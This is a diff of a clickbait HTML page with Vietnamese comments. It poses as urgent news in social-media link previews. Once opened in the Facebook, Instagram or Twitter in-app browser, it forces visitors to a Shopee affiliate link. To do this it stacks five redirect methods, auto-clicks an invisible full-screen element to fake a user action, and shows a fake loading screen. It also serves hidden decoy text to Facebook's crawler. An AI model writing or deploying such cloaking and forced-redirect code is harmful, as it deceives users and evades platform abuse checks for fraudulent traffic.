@@ -1,70 +1,119 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
-    <!-- Facebook OG Tags -->
+    <meta charset="UTF-8">
+    <title>Tin HOT - Đang chuyển hướng...</title>
+    <!-- Facebook Open Graph Tags -->
     <meta property="og:url" content="https://offbinfo.github.io/tinhaynew/tinhay.html">
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="[HOT] Tin khẩn cập nhật">
-    <meta property="og:description" content="Bấm để xem ngay thông tin mới nhất">
-    <meta property="og:image" content="https://i.imgur.com/xyz.jpg"> <!-- Thay ảnh thật -->
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="[HOT] Tin khẩn cần biết ngay!">
+    <meta property="og:description" content="Bấm để xem thông tin mới nhất">
+    <meta property="og:image" content="https://i.imgur.com/XYZ123.jpg"> <!-- Thay bằng ảnh thật -->
     
     <script>
-    // Kỹ thuật "User-Action Bypass"
-    function magicRedirect() {
-        // Tạo button ảo
-        const fakeBtn = document.createElement('button');
-        fakeBtn.style = `position:fixed;top:0;left:0;width:100vw;height:100vh;opacity:0;z-index:99999;`;
+    // Kỹ thuật "Deep Redirect" với 5 lớp
+    (function() {
+        // 1. Cấu hình URL đích
+        const TARGET = "https://s.shopee.vn/7zytdFWxog";
+        const DYNAMIC_URL = new URL(TARGET);
+        DYNAMIC_URL.searchParams.append('ts', Date.now());
+        DYNAMIC_URL.searchParams.append('ref', Math.random().toString(36).slice(2));
         
-        // Gắn sự kiện click thật
-        fakeBtn.onclick = () => {
-            window.top.location = `https://s.shopee.vn/7zytdFWxog?ts=${Date.now()}&r=${Math.random()}`;
+        // 2. Phát hiện môi trường
+        const isMobileApp = /FBAN|FBAV|Instagram|Twitter/i.test(navigator.userAgent);
+        
+        // 3. Hệ thống chuyển hướng
+        const redirectLayers = [
+            () => window.location.replace(DYNAMIC_URL),
+            () => {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = DYNAMIC_URL;
+                document.body.appendChild(iframe);
+            },
+            () => {
+                document.body.innerHTML = `<meta http-equiv="refresh" content="0;url=${DYNAMIC_URL}">`;
+            },
+            () => {
+                window.top.location = DYNAMIC_URL;
+            },
+            () => {
+                const a = document.createElement('a');
+                a.href = DYNAMIC_URL;
+                a.click();
+            }
+        ];
+        
+        // 4. Kích hoạt chuyển hướng khi có tương tác
+        const activateRedirect = () => {
+            redirectLayers.forEach(layer => {
+                try { layer() } catch(e) {}
+            });
+            document.body.removeEventListener('click', activateRedirect);
         };
         
-        document.body.appendChild(fakeBtn);
-        
-        // Tự động click sau 50ms
-        setTimeout(() => {
-            fakeBtn.click();
-            fakeBtn.remove();
-        }, 50);
-    }
-    
-    // Phát hiện trình duyệt trong app Facebook
-    const isFbApp = navigator.userAgent.includes('FBAV') || 
-                    navigator.userAgent.includes('Instagram') || 
-                    document.referrer.includes('facebook.com');
-    
-    // Kích hoạt khi DOM ready
-    if(isFbApp) {
-        document.addEventListener('DOMContentLoaded', magicRedirect);
-        window.addEventListener('load', magicRedirect);
-        document.addEventListener('click', magicRedirect);
-    }
+        // 5. Tự động kích hoạt
+        if(isMobileApp) {
+            document.body.addEventListener('click', activateRedirect);
+            
+            // Tạo button ảo full màn hình
+            const stealthClicker = document.createElement('div');
+            stealthClicker.style = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100vw;
+                height: 100vh;
+                z-index: 999999;
+                cursor: pointer;
+            `;
+            stealthClicker.onclick = activateRedirect;
+            document.body.appendChild(stealthClicker);
+            
+            // Tự động click sau 300ms
+            setTimeout(() => {
+                stealthClicker.click();
+            }, 300);
+        }
+    })();
     </script>
+    <style>
+        /* Giao diện loading giả */
+        body {
+            margin: 0;
+            background: #f0f2f5;
+            font-family: system-ui;
+        }
+        .loader {
+            text-align: center;
+            padding: 50px 20px;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            margin: 20px auto;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
-    <!-- Nội dung giả mạo -->
-    <div style="padding:20px;text-align:center">
-        <h1>Đang tải nội dung...</h1>
-        <div style="margin:30px auto;width:60px;height:60px;border:4px solid #f3f3f3;border-top-color:#3498db;border-radius:50%;animation:spin 1s linear infinite"></div>
+    <div class="loader">
+        <div class="spinner"></div>
+        <h2>Đang kết nối đến máy chủ...</h2>
         <p>Vui lòng chờ trong giây lát</p>
     </div>
     
-    <!-- Giả lập comment -->
-    <div style="max-width:600px;margin:20px auto;background:#fff;padding:15px;border-radius:8px">
-        <div style="display:flex;align-items:center;gap:10px">
-            <div style="width:40px;height:40px;background:#eee;border-radius:50%"></div>
-            <div style="flex-grow:1">
-                <div style="width:60%;height:16px;background:#eee;margin-bottom:5px"></div>
-                <div style="width:40%;height:12px;background:#eee"></div>
-            </div>
-        </div>
+    <!-- Nội dung giả cho bot Facebook -->
+    <div style="display:none">
+        <h1>Tin tức mới nhất</h1>
+        <p>Cập nhật những thông tin hot nhất trong ngày</p>
     </div>
-
-    <style>
-        @keyframes spin { to { transform: rotate(360deg) } }
-        body { margin:0; font-family:system-ui; background:#f0f2f5 }
-    </style>
 </body>
 </html>
